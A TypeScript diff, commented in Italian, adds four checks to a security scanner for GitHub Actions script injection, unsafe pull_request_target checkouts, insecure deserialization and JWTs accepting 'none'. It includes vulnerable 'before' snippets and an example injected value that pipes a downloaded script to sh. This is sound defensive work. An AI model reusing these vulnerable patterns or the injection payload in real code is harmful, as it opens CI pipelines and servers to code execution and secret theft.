@@ -10,6 +10,7 @@ import {
   isDockerfile,
   isKubernetesManifest,
   isTerraformFile,
+  isGithubActionsWorkflow,
   nearbyMatches,
   redactLine,
 } from "../util/scan.js";
@@ -45,6 +46,47 @@ const K8S_PRIVILEGED = /^\s*privileged:\s*true\b/gim;
 const K8S_ENV_SECRET_NAME_LINE = new RegExp(`^\\s*-\\s*name:\\s*["']?(\\w*(?:${DOCKERFILE_SECRET_VAR_NAME.source})\\w*)["']?\\s*$`, "i");
 const K8S_ENV_VALUE_FROM_LINE = /^\s*valueFrom:/i;
 const K8S_ENV_VALUE_LINE = /^\s*value:\s*["']?([^"'\s][^"']*?)["']?\s*$/i;
+
+// Punto 13, nuovo blocco: sicurezza dei workflow GitHub Actions. Nessun
+// parser YAML qui neanche — stesso approccio già scelto per Dockerfile/K8s/
+// Terraform, coerente col resto del motore.
+//
+// Valori che arrivano da chi ha aperto la pull request/issue/commento, mai
+// da chi possiede il repository: interpolati direttamente in un comando
+// shell permettono di eseguire comandi arbitrari nella CI (è la classe di
+// vulnerabilità dietro molti incidenti reali di "GitHub Actions script injection").
+const GHA_DANGEROUS_EXPRESSION =
+  /\$\{\{\s*(github\.event\.(issue|pull_request|comment|review|discussion)\.(title|body)|github\.event\.head_commit\.message|github\.head_ref|github\.event\.pages\.\d+\.page_name|github\.event\.commits\.\d+\.message)\s*\}\}/;
+// Cattura l'indentazione e il resto della riga dopo "run:" — serve per
+// distinguere un comando inline ("run: echo ...") da un blocco multilinea
+// ("run: |"), e nel secondo caso per sapere dove il blocco finisce (quando
+// l'indentazione torna al livello di "run:" stesso).
+const GHA_RUN_STEP = /^(\s*)(?:-\s*)?run:\s*(.*)$/;
+
+// "pull_request_target" gira con i permessi e i segreti del repository di
+// base anche per una pull request da un fork esterno — a differenza di
+// "pull_request", che gira con permessi minimi. Se in più il workflow fa il
+// checkout del codice della PR (invece che del branch di base) ed esegue
+// qualcosa su quel codice, chi ha aperto la PR ottiene di fatto accesso ai
+// segreti del repository.
+const GHA_PULL_REQUEST_TARGET_TRIGGER = /^\s*pull_request_target\s*:/im;
+const GHA_CHECKOUT_PR_HEAD = /ref:\s*\$\{\{\s*github\.event\.pull_request\.head\.(sha|ref)\s*\}\}/;
+
+// pickle (Python), unserialize() (PHP), ObjectInputStream (Java) e la
+// libreria "node-serialize" (Node) deserializzano un formato che può
+// contenere ed eseguire codice, non solo dati — a differenza di JSON. Se il
+// valore deserializzato arriva dalla richiesta, chi la invia può far
+// eseguire codice arbitrario sul server.
+const INSECURE_DESERIALIZATION_PYTHON_PICKLE = /\bpickle\.(loads|load)\s*\(\s*(request\.(data|get_data\(\)|body)|\.body\b)/gi;
+const INSECURE_DESERIALIZATION_PHP_UNSERIALIZE = /\bunserialize\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)\[/g;
+const INSECURE_DESERIALIZATION_JAVA_OIS = /new\s+ObjectInputStream\s*\(\s*(request\.getInputStream\(\)|httpServletRequest\.getInputStream\(\))/gi;
+const INSECURE_DESERIALIZATION_NODE_SERIALIZE = /\bunserialize\s*\(\s*req\.(body|query|params)/gi;
+
+// Un token/sessione/JWT che il codice accetta esplicitamente senza firma
+// ("none" come algoritmo): chiunque può costruire un token con qualunque
+// contenuto (es. "ruolo: admin") e farlo accettare come valido, perché non
+// viene verificata nessuna firma.
+const JWT_NONE_ALGORITHM = /\b(algorithms?)\s*[:=]\s*(\[[^\]]*["']none["'][^\]]*\]|["']none["'])/i;
 
 // L'operatore di assegnazione: "=" o ":" in JS/Python, ma anche ":=" in Go
 // (dichiarazione breve di variabile) — va provato per primo, altrimenti il
@@ -929,5 +971,128 @@ export const criticalChecks: Check[] = [
     // intende passare il valore vero (tfvars? variabile d'ambiente?
     // un secret manager?) rischia di rompere ogni "terraform plan/apply"
     // finché qualcuno non decide come sostituirlo.
+  },
+
+  {
+    id: "gha-script-injection",
+    severity: "critical",
+    confidence: "confirmed",
+    title: "Un valore controllato da un utente esterno entra direttamente in un comando shell della CI",
+    description:
+      "Un comando \"run:\" di un workflow GitHub Actions interpola direttamente un valore come il titolo di una pull request, il nome di un branch o il testo di un commento — tutti scrivibili da chiunque apra una pull request o un commento, anche da un fork esterno. Un valore come `\"; curl malware.sh | sh #` eseguirebbe comandi arbitrari nella CI, con accesso a tutti i segreti disponibili in quel workflow.",
+    fix: {
+      before: `- run: echo "${"${{ github.event.pull_request.title }}"}"`,
+      after: `- env:\n    PR_TITLE: ${"${{ github.event.pull_request.title }}"}\n  run: echo "$PR_TITLE"  # passato come variabile d'ambiente, mai interpolato direttamente nel comando`,
+    },
+    detect(file) {
+      if (!isGithubActionsWorkflow(file)) return [];
+      const matches: CheckMatch[] = [];
+      const lines = file.content.split("\n");
+
+      lines.forEach((lineText, idx) => {
+        const m = GHA_RUN_STEP.exec(lineText);
+        if (!m) return;
+        const [, indent, inline] = m;
+        const trimmedInline = inline.trim();
+
+        if (trimmedInline !== "" && trimmedInline !== "|" && trimmedInline !== ">" && !/^[|>][+-]?\s*$/.test(trimmedInline)) {
+          // Comando inline sulla stessa riga di "run:".
+          if (GHA_DANGEROUS_EXPRESSION.test(inline)) {
+            matches.push({ line: idx + 1, snippet: redactLine(lineText, 0, lineText.length) });
+          }
+          return;
+        }
+
+        // Blocco multilinea ("run: |" o "run: >"): scansiona le righe
+        // successive più indentate, finché l'indentazione non torna al
+        // livello di "run:" stesso (fine del blocco).
+        const baseIndent = indent.length;
+        for (let j = idx + 1; j < Math.min(idx + 30, lines.length); j++) {
+          const next = lines[j];
+          if (next.trim() === "") continue;
+          const nextIndent = next.length - next.trimStart().length;
+          if (nextIndent <= baseIndent) break;
+          if (GHA_DANGEROUS_EXPRESSION.test(next)) {
+            matches.push({ line: j + 1, snippet: redactLine(next, 0, next.length) });
+          }
+        }
+      });
+
+      return matches;
+    },
+    // Nessun autofix: richiede introdurre un blocco "env:" e sostituire ogni
+    // occorrenza nel comando con la variabile — una riscrittura strutturale,
+    // non una singola riga, che rischia di rompere il workflow se fatta alla cieca.
+  },
+
+  {
+    id: "gha-pull-request-target-checkout",
+    severity: "critical",
+    confidence: "confirmed",
+    title: "Il workflow esegue il codice di una pull request esterna con accesso ai segreti del repository",
+    description:
+      "Il workflow usa \"pull_request_target\" — che gira con i permessi e i segreti del repository di base anche per una pull request aperta da un fork estraneo — e fa il checkout del codice della pull request stessa (\"github.event.pull_request.head\"), non del branch di base. Chi apre la pull request ottiene di fatto l'esecuzione del proprio codice con accesso a quei segreti.",
+    fix: {
+      before: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${"${{ github.event.pull_request.head.sha }}"}`,
+      after: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      # Fa il checkout del branch di base, non del codice della PR — oppure usa\n      # "pull_request" invece di "pull_request_target" se non servono i\n      # permessi/segreti più ampi.\n      - uses: actions/checkout@v4`,
+    },
+    detect(file) {
+      if (!isGithubActionsWorkflow(file)) return [];
+      if (!GHA_PULL_REQUEST_TARGET_TRIGGER.test(file.content)) return [];
+      return scanLines(file, GHA_CHECKOUT_PR_HEAD);
+    },
+    // Nessun autofix: rimuovere il checkout del codice della PR, o passare a
+    // "pull_request", è una decisione che cambia cosa il workflow può fare —
+    // va presa da chi lo ha scritto, non applicata alla cieca.
+  },
+
+  {
+    id: "insecure-deserialization",
+    severity: "critical",
+    confidence: "confirmed",
+    title: "Dati della richiesta vengono deserializzati con un formato che può eseguire codice",
+    description:
+      "pickle (Python), unserialize() (PHP), ObjectInputStream (Java) o la libreria node-serialize (Node) stanno deserializzando un valore preso direttamente dalla richiesta. A differenza di JSON, questi formati possono rappresentare ed eseguire codice durante la stessa deserializzazione — chi controlla il valore inviato può ottenere l'esecuzione di codice arbitrario sul server.",
+    fix: {
+      before: `data = pickle.loads(request.data)`,
+      after: `import json\ndata = json.loads(request.data)  # JSON non esegue mai codice in fase di parsing, a differenza di pickle`,
+    },
+    detect(file) {
+      return [
+        ...scanLines(file, INSECURE_DESERIALIZATION_PYTHON_PICKLE),
+        ...scanLines(file, INSECURE_DESERIALIZATION_PHP_UNSERIALIZE),
+        ...scanLines(file, INSECURE_DESERIALIZATION_JAVA_OIS),
+        ...scanLines(file, INSECURE_DESERIALIZATION_NODE_SERIALIZE),
+      ];
+    },
+    // Nessun autofix: passare a un formato sicuro (JSON) è una scelta che
+    // cambia cosa il client deve inviare — non una riscrittura meccanica
+    // della sola riga segnalata.
+  },
+
+  {
+    id: "jwt-none-algorithm",
+    severity: "critical",
+    confidence: "confirmed",
+    title: "Il codice accetta esplicitamente token JWT non firmati (algoritmo \"none\")",
+    description:
+      "\"none\" compare tra gli algoritmi accettati per verificare un token JWT. Un token con algoritmo \"none\" non ha nessuna firma da verificare: chiunque può costruirne uno con qualunque contenuto (es. un ruolo da amministratore) e il codice lo accetterebbe come valido.",
+    fix: {
+      before: `jwt.verify(token, secret, { algorithms: ["HS256", "none"] })`,
+      after: `jwt.verify(token, secret, { algorithms: ["HS256"] })  // mai includere "none" tra gli algoritmi accettati`,
+    },
+    detect(file) {
+      return scanLines(file, JWT_NONE_ALGORITHM);
+    },
+    autofix(file) {
+      const { content, changed } = replaceLines(file.content, new RegExp(JWT_NONE_ALGORITHM.source, "gi"), (line, m) => {
+        const [whole, , value] = m;
+        if (!value.startsWith("[")) return null; // algoritmo singolo "none": nessun altro algoritmo da tenere, va deciso da chi scrive il codice
+        const cleaned = value.replace(/\s*,?\s*["']none["']\s*,?/i, "").replace(/,\s*\]/, "]");
+        if (/\[\s*\]/.test(cleaned)) return null; // toglierebbe l'ultimo algoritmo rimasto: niente da proporre in automatico
+        return line.slice(0, m.index) + whole.replace(value, cleaned) + line.slice(m.index + whole.length);
+      });
+      return changed ? content : null;
+    },
   },
 ];
